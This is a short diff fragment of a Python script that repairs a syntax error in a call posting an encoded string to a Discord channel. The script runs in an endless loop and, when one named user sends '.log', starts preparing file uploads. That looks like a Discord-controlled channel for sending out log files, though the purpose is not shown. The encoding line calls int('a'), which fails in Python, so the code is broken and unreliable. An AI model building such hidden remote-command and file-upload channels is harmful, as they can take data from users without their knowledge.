@@ -77,7 +77,7 @@ while True:
                 else:
                     dc += str(int(char)-int('a'))+"-"
             r = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=header, data={
-                              "content": dc"})
+                              "content": dc})
 
         if username == "i have no brain" and content == ".log":
             files = {
